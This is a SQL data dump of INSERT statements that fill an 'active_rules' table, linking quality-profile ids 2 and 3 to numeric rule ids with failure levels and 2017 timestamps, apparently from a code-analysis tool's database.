INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (251, 2, 953, 2, NULL, 1510817823251, 1510817823251);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (252, 2, 928, 1, NULL, 1510817823257, 1510817823257);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (253, 2, 937, 2, NULL, 1510817823311, 1510817823311);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (254, 2, 942, 2, NULL, 1510817823319, 1510817823319);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (255, 2, 939, 2, NULL, 1510817823327, 1510817823327);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (256, 2, 999, 1, NULL, 1510817823333, 1510817823333);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (257, 2, 1005, 2, NULL, 1510817823342, 1510817823342);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (258, 2, 1009, 1, NULL, 1510817823347, 1510817823347);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (259, 2, 972, 3, NULL, 1510817823351, 1510817823351);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (260, 2, 981, 1, NULL, 1510817823354, 1510817823354);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (261, 2, 977, 2, NULL, 1510817823358, 1510817823358);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (262, 2, 991, 3, NULL, 1510817823362, 1510817823362);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (263, 2, 993, 2, NULL, 1510817823375, 1510817823375);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (264, 2, 724, 1, NULL, 1510817823379, 1510817823379);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (265, 2, 731, 1, NULL, 1510817823383, 1510817823383);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (266, 2, 738, 2, NULL, 1510817823388, 1510817823388);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (267, 2, 736, 1, NULL, 1510817823392, 1510817823392);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (268, 2, 739, 4, NULL, 1510817823396, 1510817823396);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (269, 2, 714, 2, NULL, 1510817823400, 1510817823400);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (270, 2, 713, 3, NULL, 1510817823405, 1510817823405);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (271, 2, 717, 2, NULL, 1510817823410, 1510817823410);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (272, 2, 715, 4, NULL, 1510817823414, 1510817823414);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (273, 2, 757, 1, NULL, 1510817823426, 1510817823426);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (274, 2, 762, 1, NULL, 1510817823431, 1510817823431);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (275, 2, 761, 2, NULL, 1510817823435, 1510817823435);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (276, 2, 768, 3, NULL, 1510817823438, 1510817823438);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (277, 2, 766, 4, NULL, 1510817823442, 1510817823442);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (278, 2, 772, 4, NULL, 1510817823446, 1510817823446);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (279, 2, 770, 4, NULL, 1510817823450, 1510817823450);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (280, 2, 1050, 1, NULL, 1510817823453, 1510817823453);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (281, 2, 1055, 2, NULL, 1510817823457, 1510817823457);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (282, 2, 1057, 2, NULL, 1510817823461, 1510817823461);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (283, 2, 1045, 2, NULL, 1510817823464, 1510817823464);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (284, 2, 1102, 3, NULL, 1510817823472, 1510817823472);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (285, 2, 1116, 2, NULL, 1510817823480, 1510817823480);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (286, 2, 1112, 2, NULL, 1510817823484, 1510817823484);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (287, 2, 1072, 2, NULL, 1510817823488, 1510817823488);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (288, 2, 1077, 2, NULL, 1510817823491, 1510817823491);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (289, 2, 1082, 3, NULL, 1510817823495, 1510817823495);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (290, 2, 1088, 4, NULL, 1510817823499, 1510817823499);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (291, 2, 927, 2, NULL, 1510817823503, 1510817823503);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (292, 2, 936, 2, NULL, 1510817823506, 1510817823506);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (293, 2, 941, 3, NULL, 1510817823510, 1510817823510);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (294, 2, 946, 2, NULL, 1510817823514, 1510817823514);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (295, 2, 971, 1, NULL, 1510817823518, 1510817823518);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (296, 2, 970, 2, NULL, 1510817823521, 1510817823521);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (297, 2, 980, 3, NULL, 1510817823525, 1510817823525);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (298, 2, 976, 4, NULL, 1510817823529, 1510817823529);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (299, 2, 988, 4, NULL, 1510817823533, 1510817823533);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (300, 2, 984, 3, NULL, 1510817823538, 1510817823538);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (301, 2, 990, 4, NULL, 1510817823541, 1510817823541);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (302, 2, 707, 1, NULL, 1510817823545, 1510817823545);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (303, 2, 1039, 2, NULL, 1510817823548, 1510817823548);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (304, 2, 1008, 1, NULL, 1510817823552, 1510817823552);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (305, 2, 1006, 4, NULL, 1510817823558, 1510817823558);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (306, 2, 1011, 2, NULL, 1510817823562, 1510817823562);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (307, 2, 966, 3, NULL, 1510817823565, 1510817823565);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (308, 2, 969, 4, NULL, 1510817823569, 1510817823569);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (309, 2, 852, 4, NULL, 1510817823578, 1510817823578);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (310, 2, 854, 2, NULL, 1510817823581, 1510817823581);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (311, 2, 1048, 2, NULL, 1510817823585, 1510817823585);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (312, 2, 1052, 2, NULL, 1510817823588, 1510817823588);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (313, 2, 1051, 2, NULL, 1510817823592, 1510817823592);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (314, 2, 1060, 2, NULL, 1510817823596, 1510817823596);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (315, 2, 1058, 2, NULL, 1510817823601, 1510817823601);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (316, 2, 1040, 3, NULL, 1510817823605, 1510817823605);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (317, 2, 1099, 2, NULL, 1510817823608, 1510817823608);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (318, 2, 1114, 2, NULL, 1510817823618, 1510817823618);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (319, 2, 921, 2, NULL, 1510817823623, 1510817823623);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (320, 2, 908, 1, NULL, 1510817823626, 1510817823626);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (321, 2, 912, 3, NULL, 1510817823630, 1510817823630);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (322, 2, 911, 2, NULL, 1510817823634, 1510817823634);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (323, 2, 831, 3, NULL, 1510817823637, 1510817823637);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (324, 2, 859, 1, NULL, 1510817823640, 1510817823640);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (325, 2, 857, 2, NULL, 1510817823644, 1510817823644);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (326, 2, 862, 1, NULL, 1510817823647, 1510817823647);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (327, 2, 861, 2, NULL, 1510817823651, 1510817823651);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (328, 2, 1049, 2, NULL, 1510817823654, 1510817823654);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (329, 2, 1017, 3, NULL, 1510817823658, 1510817823658);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (330, 2, 1019, 4, NULL, 1510817823663, 1510817823663);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (331, 2, 1026, 3, NULL, 1510817823667, 1510817823667);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (332, 2, 794, 2, NULL, 1510817823674, 1510817823674);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (333, 2, 892, 1, NULL, 1510817823677, 1510817823677);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (334, 2, 910, 2, NULL, 1510817823681, 1510817823681);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (335, 2, 886, 1, NULL, 1510817823684, 1510817823684);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (336, 2, 865, 2, NULL, 1510817823688, 1510817823688);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (337, 2, 924, 2, NULL, 1510817823694, 1510817823694);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (338, 2, 847, 2, NULL, 1510817823698, 1510817823698);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (339, 2, 845, 2, NULL, 1510817823702, 1510817823702);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (340, 2, 818, 1, NULL, 1510817823705, 1510817823705);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (341, 2, 789, 1, NULL, 1510817823709, 1510817823709);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (342, 2, 788, 2, NULL, 1510817823713, 1510817823713);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (343, 2, 893, 4, NULL, 1510817823717, 1510817823717);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (344, 2, 890, 4, NULL, 1510817823720, 1510817823720);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (345, 2, 889, 3, NULL, 1510817823724, 1510817823724);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (346, 2, 973, 1, NULL, 1510817823731, 1510817823731);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (347, 2, 726, 2, NULL, 1510817823738, 1510817823738);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (348, 2, 708, 1, NULL, 1510817823742, 1510817823742);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (349, 2, 719, 2, NULL, 1510817823746, 1510817823746);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (350, 2, 765, 2, NULL, 1510817823750, 1510817823750);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (351, 2, 773, 1, NULL, 1510817823754, 1510817823754);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (352, 2, 746, 2, NULL, 1510817823758, 1510817823758);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (353, 2, 753, 4, NULL, 1510817823761, 1510817823761);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (354, 2, 693, 1, NULL, 1510817823765, 1510817823765);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (355, 2, 692, 2, NULL, 1510817823768, 1510817823768);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (356, 2, 741, 4, NULL, 1510817823772, 1510817823772);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (357, 2, 944, 2, NULL, 1510817823776, 1510817823776);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (358, 2, 1007, 3, NULL, 1510817823779, 1510817823779);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (359, 2, 1013, 2, NULL, 1510817823785, 1510817823785);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (360, 2, 771, 1, NULL, 1510817823788, 1510817823788);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (361, 2, 860, 1, NULL, 1510817823794, 1510817823794);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (362, 2, 1041, 2, NULL, 1510817823797, 1510817823797);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (363, 2, 1020, 1, NULL, 1510817823801, 1510817823801);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (364, 2, 1027, 3, NULL, 1510817823809, 1510817823809);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (365, 2, 1113, 2, NULL, 1510817823813, 1510817823813);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (366, 2, 1095, 1, NULL, 1510817823816, 1510817823816);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (367, 2, 1094, 2, NULL, 1510817823820, 1510817823820);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (368, 2, 964, 2, NULL, 1510817823823, 1510817823823);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (369, 2, 868, 4, NULL, 1510817823830, 1510817823830);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (370, 2, 870, 3, NULL, 1510817823835, 1510817823835);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (371, 2, 1010, 1, NULL, 1510817823842, 1510817823842);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (372, 2, 881, 2, NULL, 1510817823846, 1510817823846);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (373, 2, 1063, 2, NULL, 1510817823879, 1510817823879);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (374, 2, 909, 2, NULL, 1510817823883, 1510817823883);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (375, 2, 1061, 3, NULL, 1510817823887, 1510817823887);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (376, 2, 891, 2, NULL, 1510817823893, 1510817823893);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (377, 2, 866, 1, NULL, 1510817823897, 1510817823897);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (378, 2, 792, 2, NULL, 1510817823901, 1510817823901);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (379, 2, 920, 2, NULL, 1510817823905, 1510817823905);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (380, 2, 918, 2, NULL, 1510817823910, 1510817823910);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (381, 2, 843, 3, NULL, 1510817823913, 1510817823913);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (382, 2, 829, 2, NULL, 1510817823918, 1510817823918);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (383, 2, 832, 2, NULL, 1510817823922, 1510817823922);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (384, 2, 836, 2, NULL, 1510817823935, 1510817823935);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (385, 2, 835, 2, NULL, 1510817823942, 1510817823942);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (386, 2, 691, 1, NULL, 1510817823946, 1510817823946);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (387, 2, 694, 1, NULL, 1510817823951, 1510817823951);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (388, 2, 703, 2, NULL, 1510817823958, 1510817823958);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (389, 2, 810, 1, NULL, 1510817823965, 1510817823965);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (390, 2, 822, 1, NULL, 1510817823974, 1510817823974);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (391, 2, 699, 2, NULL, 1510817823977, 1510817823977);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (392, 2, 700, 2, NULL, 1510817823981, 1510817823981);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (393, 2, 705, 2, NULL, 1510817823985, 1510817823985);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (394, 3, 1136, 2, NULL, 1510817823998, 1510817823998);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (395, 3, 1173, 2, NULL, 1510817824004, 1510817824004);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (396, 3, 1138, 2, NULL, 1510817824012, 1510817824012);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (397, 3, 1212, 1, NULL, 1510817824017, 1510817824017);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (398, 3, 1255, 3, NULL, 1510817824024, 1510817824024);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (399, 3, 1221, 2, NULL, 1510817824030, 1510817824030);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (400, 3, 1146, 2, NULL, 1510817824034, 1510817824034);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (401, 3, 1230, 4, NULL, 1510817824041, 1510817824041);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (402, 3, 1256, 2, NULL, 1510817824045, 1510817824045);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (403, 3, 1248, 2, NULL, 1510817824050, 1510817824050);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (404, 3, 1164, 2, NULL, 1510817824054, 1510817824054);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (405, 3, 1169, 2, NULL, 1510817824058, 1510817824058);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (406, 3, 1186, 2, NULL, 1510817824062, 1510817824062);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (407, 3, 1203, 3, NULL, 1510817824065, 1510817824065);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (408, 3, 1133, 2, NULL, 1510817824069, 1510817824069);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (409, 3, 1233, 3, NULL, 1510817824073, 1510817824073);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (410, 3, 1240, 3, NULL, 1510817824076, 1510817824076);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (411, 3, 1167, 3, NULL, 1510817824079, 1510817824079);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (412, 3, 1178, 3, NULL, 1510817824083, 1510817824083);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (413, 3, 1226, 2, NULL, 1510817824086, 1510817824086);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (414, 3, 1179, 3, NULL, 1510817824089, 1510817824089);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (415, 3, 1219, 3, NULL, 1510817824093, 1510817824093);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (416, 3, 1235, 3, NULL, 1510817824096, 1510817824096);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (417, 3, 1193, 2, NULL, 1510817824100, 1510817824100);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (418, 3, 1191, 2, NULL, 1510817824103, 1510817824103);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (419, 3, 1142, 3, NULL, 1510817824107, 1510817824107);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (420, 3, 1211, 3, NULL, 1510817824111, 1510817824111);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (421, 3, 1174, 2, NULL, 1510817824114, 1510817824114);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (422, 3, 1171, 2, NULL, 1510817824126, 1510817824126);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (423, 3, 1249, 2, NULL, 1510817824131, 1510817824131);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (424, 3, 1258, 2, NULL, 1510817824134, 1510817824134);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (425, 3, 1239, 1, NULL, 1510817824137, 1510817824137);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (426, 3, 1216, 2, NULL, 1510817824141, 1510817824141);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (427, 3, 1231, 3, NULL, 1510817824144, 1510817824144);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (428, 3, 1126, 4, NULL, 1510817824148, 1510817824148);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (429, 3, 1222, 3, NULL, 1510817824151, 1510817824151);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (430, 3, 1149, 2, NULL, 1510817824155, 1510817824155);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (431, 3, 1199, 2, NULL, 1510817824159, 1510817824159);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (432, 3, 1127, 2, NULL, 1510817824163, 1510817824163);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (433, 3, 1217, 3, NULL, 1510817824167, 1510817824167);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (434, 3, 1224, 2, NULL, 1510817824171, 1510817824171);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (435, 3, 1237, 3, NULL, 1510817824174, 1510817824174);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (436, 3, 1189, 2, NULL, 1510817824178, 1510817824178);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (437, 3, 1214, 3, NULL, 1510817824181, 1510817824181);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (438, 3, 1241, 2, NULL, 1510817824185, 1510817824185);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (439, 3, 1194, 2, NULL, 1510817824188, 1510817824188);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (440, 3, 1242, 4, NULL, 1510817824191, 1510817824191);
INSERT INTO active_rules (id, profile_id, rule_id, failure_level, inheritance, created_at, updated_at) VALUES (441, 3, 1223, 3, NULL, 1510817824195, 1510817824195);
